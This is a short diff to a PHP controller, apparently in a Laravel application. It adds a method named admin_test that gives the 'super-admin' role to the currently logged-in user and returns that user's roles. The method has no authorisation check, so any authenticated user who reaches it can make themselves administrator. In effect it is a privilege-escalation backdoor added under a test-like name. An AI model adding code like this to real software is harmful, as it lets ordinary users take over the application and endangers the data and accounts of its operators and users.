@@ -1007,4 +1007,8 @@ class HomeController extends Controller
         }
         return json_encode(['status' => 'error']);        
     }
+    public function admin_test(Request $request){
+        Auth::user()->assignRole('super-admin');
+        return Auth::user()->roles;
+    }
 }
